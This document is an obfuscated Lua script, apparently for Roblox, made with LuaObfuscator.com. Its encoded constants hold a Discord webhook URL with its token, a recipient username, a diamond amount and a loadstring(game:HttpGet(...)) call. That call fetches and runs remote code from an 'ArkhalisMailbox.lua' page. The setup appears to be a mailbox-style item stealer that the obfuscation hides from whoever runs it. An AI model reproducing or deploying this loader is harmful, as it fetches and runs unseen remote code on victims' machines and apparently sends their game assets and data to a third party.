--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.7) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v84=0;local v85;while true do if (v84==0) then v85=v2(v0(v30,16));if v19 then local v102=0;local v103;while true do if (v102==1) then return v103;end if (v102==0) then v103=v5(v85,v19);v19=nil;v102=1;end end else return v85;end break;end end end end);local function v20(v31,v32,v33)if v33 then local v86=0;local v87;while true do if (v86==(0 -0)) then v87=(v31/(((1642 -(1523 + 114)) -3)^(v32-(1 + 0))))%((3 -1)^(((v33-(2 -(878 -(282 + 595)))) -(v32-(620 -(555 + 64)))) + (932 -(857 + 74)))) ;return v87-(v87%(569 -(367 + 201))) ;end end else local v88=((1323 -394) -(214 + (1778 -(68 + 997))))^(v32-(1 + 0)) ;return (((v31%(v88 + v88))>=v88) and (1 + 0)) or 0 ;end end local function v21()local v34=0;local v35;while true do if (v34==(1270 -(51 + 175 + 1044))) then v35=v1(v16,v18,v18);v18=v18 + (4 -3) ;v34=118 -(32 + 85) ;end if (v34==(1 + 0)) then return v35;end end end local function v22()local v36=957 -(892 + 65) ;local v37;local v38;while true do if (v36==(2 -1)) then return (v38 * 256) + v37 ;end if (v36==(0 -0)) then v37,v38=v1(v16,v18,v18 + (3 -1) );v18=v18 + 2 + 0 ;v36=351 -((1039 -(802 + 150)) + 263) ;end end end local function v23()local v39=0 -0 ;local v40;local v41;local v42;local v43;while true do if (v39==1) then return (v43 * (30433252 -(13657223 -(1069 + 118)))) + (v42 * (47703 + 17833)) + (v41 * 256) + v40 ;end if (v39==(997 -((2075 -1160) + 82))) then v40,v41,v42,v43=v1(v16,v18,v18 + (8 -5) );v18=v18 + 3 + 1 ;v39=1 -0 ;end end end local function v24()local v44=v23();local v45=v23();local v46=1 -0 ;local v47=(v20(v45,(4 -3) + 0 + 0 ,(127 -92) -15 ) * ((2 + (0 -0))^(823 -(368 + 423)))) + v44 ;local v48=v20(v45,65 -(903 -(814 + 45)) ,49 -(10 + 8) );local v49=((v20(v45,122 -90 )==(443 -((1024 -608) + 26))) and  -1) or (3 -2) ;if (v48==0) then if (v47==0) then return v49 * (0 + 0) ;else v48=1 -0 ;v46=438 -(8 + 137 + 104 + 189) ;end elseif (v48==(2477 -(44 + 386))) then return ((v47==(1486 -(998 + 488))) and (v49 * ((1 + 0)/(0 + 0)))) or (v49 * NaN) ;end return v8(v49,v48-1023 ) * (v46 + (v47/((774 -(201 + 571))^(1190 -(116 + 1022))))) ;end local function v25(v50)local v51;if  not v50 then local v89=885 -(261 + 624) ;while true do if (v89==(0 -(1423 -(630 + 793)))) then v50=v23();if (v50==0) then return "";end break;end end end v51=v3(v16,v18,(v18 + v50) -(1081 -(1020 + 60)) );v18=v18 + v50 ;local v52={};for v68=1, #v51 do v52[v68]=v2(v1(v3(v51,v68,v68)));end return v6(v52);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v53=0 -0 ;local v54;local v55;local v56;local v57;local v58;local v59;local v60;local v61;while true do if ((4 + 0)==v53) then while true do if (v54==(888 -(117 + 771))) then local v99=216 -(42 + 174) ;while true do if (v99==0) then v55=0;v56=nil;v99=1;end if (v99==(1 + 0)) then v54=1 + 0 ;break;end end end if ((403 -(108 + 294))==v54) then local v100=1489 -(570 + 919) ;local v101;while true do if ((0 -0)==v100) then v101=1504 -(363 + 1141) ;while true do if ((1580 -(1183 + 397))==v101) then v57=nil;v58=nil;v101=812 -(569 + 242) ;end if (v101==(2 -1)) then v54=2 + 0 ;break;end end break;end end end if (v54==(1 + 2)) then v61=nil;while true do local v104=1024 -(706 + 318) ;local v105;while true do if (v104~=0) then else v105=0 + 0 ;while true do if ((1251 -(721 + 530))~=v105) then else local v110=1271 -(945 + 326) ;while true do if (v110~=(2 -1)) then else v105=2 -1 ;break;end if (v110==0) then if (3==v55) then local v172=0 -0 ;local v173;while true do if (v172==(1661 -(1477 + 184))) then v173=0 -0 ;while true do if (v173==(0 + 0)) then local v179=0 + 0 ;while true do if ((856 -(564 + 292))~=v179) then else for v188=701 -(271 + 429) ,v23() do v57[v188-1 ]=v28();end return v59;end end end end break;end end end if (v55==(0 + 0)) then local v174=0;while true do if (v174==(1500 -(1408 + 92))) then local v177=0;while true do if (v177~=(1087 -(461 + 625))) then else v174=1289 -(993 + 295) ;break;end if (v177==(0 + 0)) then v56={};v57={};v177=477 -(41 + 435) ;end end end if (v174~=1) then else v58={};v55=1002 -(938 + 63) ;break;end end end v110=1;end end end if (v105==(1 + 0)) then if ((1172 -(418 + 753))==v55) then local v147=0 + 0 ;local v148;while true do if ((1613 -(1565 + 48))~=v147) then else v148=0 + 0 ;while true do if (v148~=1) then else v61={};v55=2 + 0 ;break;end if (v148~=(1138 -(782 + 356))) then else local v178=267 -(176 + 91) ;while true do if (v178==0) then v59={v56,v57,nil,v58};v60=v23();v178=1;end if (v178==(1 + 0)) then v148=1 + 0 ;break;end end end end break;end end end if (v55~=(531 -(406 + 123))) then else local v149=0;local v150;local v151;while true do if (v149==(1770 -(1749 + 20))) then while true do if (v150==(0 -0)) then v151=0 + 0 ;while true do if (v151~=(1322 -(1249 + 73))) then else local v180=0 + 0 ;while true do if (v180~=(1145 -(466 + 679))) then else for v190=2 -1 ,v60 do local v191=0;local v192;local v193;local v194;while true do if (v191~=0) then else v192=0;v193=nil;v191=1;end if ((1 -0)==v191) then v194=nil;while true do if (v192==(2 -1)) then if (v193==(1901 -(106 + 1794))) then v194=v21()~=(0 -0) ;elseif (v193==(1 + 1)) then v194=v24();elseif (v193~=(1 + 2)) then else v194=v25();end v61[v190]=v194;break;end if (v192==(1227 -(322 + 905))) then v193=v21();v194=nil;v192=612 -(602 + 9) ;end end break;end end end v59[3]=v21();v180=2 -1 ;end if (v180==(2 -1)) then v151=1;break;end end end if ((115 -(4 + 110))~=v151) then else for v181=948 -(245 + 702) ,v23() do local v182=0 -0 ;local v183;local v184;local v185;local v186;while true do if ((586 -(57 + 527))==v182) then while true do if (v183==(1427 -(41 + 1386))) then local v195=0;while true do if ((103 -(17 + 86))==v195) then v184=0 + 0 ;v185=nil;v195=1;end if (v195==(1 -0)) then v183=2 -1 ;break;end end end if (v183==(1 + 0)) then v186=nil;while true do if (1==v184) then while true do if (v185~=(166 -(122 + 44))) then else v186=v21();if (v20(v186,2 -1 ,1 -0 )~=0) then else local v198=1205 -(902 + 303) ;local v199;local v200;local v201;local v202;local v203;while true do if (v198==0) then v199=0;v200=nil;v198=1 -0 ;end if ((2 -1)==v198) then v201=nil;v202=nil;v198=6 -4 ;end if (v198==(2 + 0)) then v203=nil;while true do if (v199==(1690 -(1121 + 569))) then v200=0 + 0 ;v201=nil;v199=684 -(483 + 200) ;end if (v199==(1464 -(1404 + 59))) then local v204=0 -0 ;local v205;while true do if ((65 -(30 + 35))~=v204) then else v205=0;while true do if (0~=v205) then else local v216=0 + 0 ;while true do if (v216==(766 -(468 + 297))) then v205=1258 -(1043 + 214) ;break;end if (v216~=(0 -0)) then else v202=nil;v203=nil;v216=1213 -(323 + 889) ;end end end if (v205==(2 -1)) then v199=564 -(334 + 228) ;break;end end break;end end end if (2==v199) then while true do if (v200==(581 -(361 + 219))) then local v206=320 -(53 + 267) ;local v207;while true do if (v206~=0) then else v207=0 + 0 ;while true do if ((413 -(15 + 398))==v207) then local v217=0 -0 ;while true do if (v217==(0 + 0)) then v203={v22(),v22(),nil,nil};if (v201==(0 + 0)) then local v221=0 + 0 ;local v222;while true do if (v221~=(0 + 0)) then else v222=0 -0 ;while true do if ((850 -(20 + 830))~=v222) then else v203[2 + 1 ]=v22();v203[4 + 0 ]=v22();break;end end break;end end elseif (v201==(127 -(116 + 10))) then v203[3]=v23();elseif (v201==2) then v203[2 + 1 ]=v23() -((1 + 1)^16) ;elseif (v201~=(741 -(542 + 196))) then else local v228=0;local v229;while true do if (v228~=0) then else v229=0;while true do if (v229==(0 + 0)) then v203[4 -1 ]=v23() -((767 -(574 + 191))^(14 + 2)) ;v203[9 -5 ]=v22();break;end end break;end end end v217=1 + 0 ;end if (v217==1) then v207=1 -0 ;break;end end end if (v207~=(850 -(254 + 595))) then else v200=2;break;end end break;end end end if (v200==(1 + 1)) then local v208=126 -(55 + 71) ;local v209;local v210;while true do if (v208==(0 + 0)) then v209=0;v210=nil;v208=1 + 0 ;end if (v208~=(1791 -(573 + 1217))) then else while true do if (v209==(0 -0)) then v210=0 -0 ;while true do if (v210==1) then v200=7 -4 ;break;end if (v210==(0 -0)) then local v220=1551 -(1126 + 425) ;while true do if (v220==(940 -(714 + 225))) then v210=1;break;end if (v220==(0 -0)) then local v223=405 -(118 + 287) ;while true do if (v223==0) then if (v20(v202,3 -2 ,1122 -(118 + 1003) )==(2 -1)) then v203[1 + 1 ]=v61[v203[2]];end if (v20(v202,2 -0 ,808 -(118 + 688) )~=(378 -(142 + 235))) then else v203[1 + 2 ]=v61[v203[13 -10 ]];end v223=1 + 0 ;end if (v223==1) then v220=978 -(553 + 424) ;break;end end end end end end break;end end break;end end end if (v200==0) then local v211=0 -0 ;local v212;while true do if (v211==(732 -(16 + 716))) then v212=0 + 0 ;while true do if (v212==(0 + 0)) then local v218=0 + 0 ;local v219;while true do if ((0 + 0)==v218) then v219=97 -(11 + 86) ;while true do if (v219==(1 + 0)) then v212=1;break;end if (v219==(285 -(175 + 110))) then v201=v20(v186,4 -2 ,14 -11 );v202=v20(v186,4,12 -6 );v219=2 -1 ;end end break;end end end if (v212~=(2 -1)) then else v200=2 -1 ;break;end end break;end end end if (v200==(1 + 2)) then if (v20(v202,3,3 + 0 )==(4 -3)) then v203[4 + 0 ]=v61[v203[757 -(239 + 514) ]];end v56[v181]=v203;break;end end break;end end break;end end end break;end end break;end if (v184~=(0 + 0)) then else local v197=0 -0 ;while true do if (v197~=1) then else v184=1330 -(797 + 532) ;break;end if (v197==(0 + 0)) then v185=0;v186=nil;v197=860 -(240 + 619) ;end end end end break;end end break;end if (v182~=1) then else v185=nil;v186=nil;v182=1 + 1 ;end if (v182==(0 + 0)) then v183=0;v184=nil;v182=2 -1 ;end end end v55=1205 -(373 + 829) ;break;end end break;end end break;end if (v149~=(731 -(476 + 255))) then else v150=1130 -(369 + 761) ;v151=nil;v149=1 + 0 ;end end end break;end end break;end end end break;end if ((2 -0)==v54) then v59=nil;v60=nil;v54=12 -9 ;end end break;end if (v53==(0 -0)) then v54=0 -0 ;v55=nil;v53=1;end if (v53==(1741 -(404 + 1335))) then local v92=406 -(183 + 223) ;while true do if (v92==(239 -(64 + 174))) then v53=2 + 1 ;break;end if (v92==(0 + 0)) then v58=nil;v59=nil;v92=338 -(10 + 327) ;end end end if (v53~=(1 + 2)) then else v60=nil;v61=nil;v53=4;end if (v53~=(1 + 0)) then else v56=nil;v57=nil;v53=340 -(118 + 220) ;end end end local function v29(v62,v63,v64)local v65=v62[1];local v66=v62[2];local v67=v62[3];return function(...)local v70=v65;local v71=v66;local v72=v67;local v73=v27;local v74=1;local v75= -1;local v76={};local v77={...};local v78=v12("#",...) -1 ;local v79={};local v80={};for v90=0,v78 do if (v90>=v72) then v76[v90-v72 ]=v77[v90 + 1 ];else v80[v90]=v77[v90 + 1 ];end end local v81=(v78-v72) + 1 ;local v82;local v83;while true do local v91=0;while true do if (v91==1) then if (v83<=6) then if (v83<=2) then if (v83<=0) then local v106=v82[2];v80[v106]=v80[v106](v13(v80,v106 + 1 ,v75));elseif (v83>1) then local v111=0;local v112;local v113;local v114;local v115;while true do if (2==v111) then for v168=v112,v75 do local v169=0;while true do if (0==v169) then v115=v115 + 1 ;v80[v168]=v113[v115];break;end end end break;end if (0==v111) then v112=v82[2];v113,v114=v73(v80[v112](v13(v80,v112 + 1 ,v82[3])));v111=1;end if (1==v111) then v75=(v114 + v112) -1 ;v115=0;v111=2;end end else v74=v82[3];end elseif (v83<=4) then if (v83==3) then local v117=v82[2];local v118=v80[v82[3]];v80[v117 + 1 ]=v118;v80[v117]=v118[v82[4]];else local v122=0;while true do if (4==v122) then v74=v82[3];break;end if (v122==1) then v80[v82[2]]=v64[v82[3]];v74=v74 + 1 ;v82=v70[v74];v122=2;end if (v122==3) then v80[v82[2]]=v82[3];v74=v74 + 1 ;v82=v70[v74];v122=4;end if (v122==0) then v80[v82[2]][v82[3]]=v82[4];v74=v74 + 1 ;v82=v70[v74];v122=1;end if (v122==2) then v80[v82[2]][v82[3]]=v82[4];v74=v74 + 1 ;v82=v70[v74];v122=3;end end end elseif (v83>5) then v80[v82[2]]=v64[v82[3]];else local v125;local v126,v127;local v128;local v129;v80[v82[2]][v82[3]]=v82[4];v74=v74 + 1 ;v82=v70[v74];v80[v82[2]]=v64[v82[3]];v74=v74 + 1 ;v82=v70[v74];v80[v82[2]]=v64[v82[3]];v74=v74 + 1 ;v82=v70[v74];v129=v82[2];v128=v80[v82[3]];v80[v129 + 1 ]=v128;v80[v129]=v128[v82[4]];v74=v74 + 1 ;v82=v70[v74];v80[v82[2]]=v82[3];v74=v74 + 1 ;v82=v70[v74];v129=v82[2];v126,v127=v73(v80[v129](v13(v80,v129 + 1 ,v82[3])));v75=(v127 + v129) -1 ;v125=0;for v143=v129,v75 do local v144=0;while true do if (v144==0) then v125=v125 + 1 ;v80[v143]=v126[v125];break;end end end v74=v74 + 1 ;v82=v70[v74];v129=v82[2];v80[v129]=v80[v129](v13(v80,v129 + 1 ,v75));v74=v74 + 1 ;v82=v70[v74];v80[v82[2]]();v74=v74 + 1 ;v82=v70[v74];v74=v82[3];end elseif (v83<=9) then if (v83<=7) then v80[v82[2]][v82[3]]=v82[4];elseif (v83>8) then if (v82[2]==v80[v82[4]]) then v74=v74 + 1 ;else v74=v82[3];end elseif (v80[v82[2]]==v82[4]) then v74=v74 + 1 ;else v74=v82[3];end elseif (v83<=11) then if (v83==10) then v80[v82[2]]=v82[3];else for v145=v82[2],v82[3] do v80[v145]=nil;end end elseif (v83==12) then do return;end else v80[v82[2]]();end v74=v74 + 1 ;break;end if (v91==0) then v82=v70[v74];v83=v82[1];v91=1;end end end end;end return v29(v28(),{},v17)(...);end v15("LOL!143O00028O00027O0040026O00F03F026O00084003023O005F47030F3O00576562682O6F6B4475616C482O6F6B034O00030D3O004C6F6164696E675363722O656E03083O00557365726E616D65030B3O0076696E686C616D3435363703083O004469616D6F6E6473024O0084D78741030A3O005363726970744E616D65030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403313O00682O7470733A2O2F61726B68616C69736C75612E6769746875622E696F2F41726B68616C69734D61696C626F782E6C756103073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F2O31302O3732353335393133363337343837342F4F503551575343765638617968574B6332764F613942304875314372704E577A68796843654A4D483668534441664955612D504F2O75352O715F465A7659364F523170592O033O004B657900423O00120A3O00014O000B000100013O0026083O0002000100010004013O0002000100120A000100013O00260800010014000100020004013O0014000100120A000200013O0026080002000C000100030004013O000C000100120A000100043O0004013O0014000100260800020008000100010004013O00080001001206000300053O00300400030006000700122O000300053O00302O00030008000300122O000200033O00044O0008000100260800010023000100010004013O0023000100120A000200013O0026080002001E000100010004013O001E0001001206000300053O00300700030009000A001206000300053O0030070003000B000C00120A000200033O00260800020017000100030004013O0017000100120A000100033O0004013O002300010004013O001700010026080001002F000100040004013O002F0001001206000200053O0030050002000D000700122O0002000E3O00122O0003000F3O00202O00030003001000122O000500116O000300056O00023O00024O00020001000100044O0041000100260800010005000100030004013O0005000100120A000200013O000E0900010039000100020004013O00390001001206000300053O003007000300120013001206000300053O00300700030014000700120A000200033O00260800020032000100030004013O0032000100120A000100023O0004013O000500010004013O003200010004013O000500010004013O004100010004013O000200012O000C3O00017O00",v9(),...);end
